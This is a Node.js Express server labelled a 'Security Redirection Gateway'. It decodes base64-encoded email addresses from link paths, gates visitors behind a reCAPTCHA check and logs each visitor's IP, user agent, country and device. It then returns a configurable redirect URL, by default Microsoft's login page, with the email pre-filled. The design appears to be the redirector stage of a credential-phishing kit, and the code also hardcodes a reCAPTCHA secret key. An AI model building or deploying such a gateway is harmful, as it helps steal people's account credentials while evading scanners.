const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Helper: Extract client IP
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || '0.0.0.0';
}

// Helper: Geolocate IP
async function lookupCountry(ip) {
    try {
        const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 3000 });
        return res.data?.country || 'Unknown';
    } catch (err) {
        return 'Unknown';
    }
}

// Helper: Detect Mobile/PC
function detectDeviceType(ua) {
    if (!ua) return 'PC';
    const lowercaseUa = ua.toLowerCase();
    const mobileKeywords = ['mobile', 'android', 'iphone', 'ipad', 'tablet', 'opera mini', 'iemobile'];
    for (const keyword of mobileKeywords) {
        if (lowercaseUa.includes(keyword)) return 'Mobile';
    }
    return 'PC';
}

// Logger: visitor logging
const logPath = path.join(__dirname, 'visitors.log');
function logVisitor(ip, ua, country, device) {
    try {
        let entries = {};
        if (fs.existsSync(logPath)) {
            const fileContent = fs.readFileSync(logPath, 'utf-8');
            const lines = fileContent.split(/\r?\n/).filter(line => line.trim().length > 0);
            for (const line of lines) {
                const parts = line.split(' | ');
                if (parts.length >= 5) {
                    entries[parts[0]] = {
                        ua: parts[1],
                        country: parts[2],
                        device: parts[3],
                        count: parseInt(parts[4], 10)
                    };
                }
            }
        }
        
        if (!entries[ip]) {
            entries[ip] = { ua, country, device, count: 0 };
        }
        entries[ip].count++;
        
        let output = '';
        for (const [key, val] of Object.entries(entries)) {
            output += `${key} | ${val.ua} | ${val.country} | ${val.device} | ${val.count}\n`;
        }
        fs.writeFileSync(logPath, output, 'utf-8');
    } catch (err) {
        console.error('Failed to log visitor:', err);
    }
}

// Helper: Parse and decode base64 email
function extractEmail(segment) {
    if (!segment) return null;
    
    let target = segment.trim();
    if (target.startsWith('$(') && target.endsWith(')')) {
        target = target.substring(2, target.length - 1);
    }
    
    // Normalize base64
    let normalized = target.replace(/-/g, '+').replace(/_/g, '/');
    const padding = normalized.length % 4;
    if (padding > 0) {
        normalized += '='.repeat(4 - padding);
    }
    
    try {
        const decoded = Buffer.from(normalized, 'base64').toString('utf8');
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (emailRegex.test(decoded)) {
            return decoded;
        }
    } catch (e) {
        // Ignore decoding errors
    }
    return null;
}

// GET: Health Check
app.get('/', (req, res) => {
    res.json({ status: 'online', service: 'Security Redirection Gateway API' });
});

// POST: Verify Turnstile Token and generate redirect URL
app.post('/verify', async (req, res) => {
    const { token, emailB64 } = req.body;
    
    if (!token || !emailB64) {
        return res.status(400).json({ status: 'error', message: 'Missing token or email parameters.' });
    }
    
    // Extract base64 segment from either path format or direct string
    const urlSegments = emailB64.split('/').filter(Boolean);
    const rawSegment = urlSegments[urlSegments.length - 1] || emailB64;
    
    const decodedEmail = extractEmail(rawSegment);
    if (!decodedEmail) {
        return res.status(400).json({ status: 'error', message: 'Invalid or missing secure email context.' });
    }
    
    const clientIp = getClientIp(req);
    
    try {
        const secretKey = process.env.RECAPTCHA_SECRET_KEY || '6LcpGUktAAAAAHyp97krWyWMHjONdjCzXxk88CDc';
        // Verify reCAPTCHA challenge token
        const response = await axios.post(
            'https://www.google.com/recaptcha/api/siteverify',
            new URLSearchParams({
                secret: secretKey,
                response: token,
                remoteip: clientIp
            }),
            { timeout: 5000 }
        );
        
        const result = response.data;
        if (result.success) {
            const ua = req.headers['user-agent'] || '';
            const country = await lookupCountry(clientIp);
            const device = detectDeviceType(ua);
            
            logVisitor(clientIp, ua, country, device);
            
            // Build the success redirect URL, attaching the email parameters
            const baseUrl = process.env.REDIRECT_BASE_URL || 'https://login.microsoftonline.com';
            const urlObj = new URL(baseUrl);
            urlObj.searchParams.set('email', decodedEmail);
            
            return res.json({
                status: 'success',
                email: decodedEmail,
                redirectUrl: urlObj.toString()
            });
        } else {
            return res.status(403).json({
                status: 'error',
                message: 'reCAPTCHA verification failed.',
                'error-codes': result['error-codes'] || []
            });
        }
    } catch (err) {
        console.error('Verification Error:', err);
        return res.status(500).json({ status: 'error', message: 'Server verification processing failed.' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
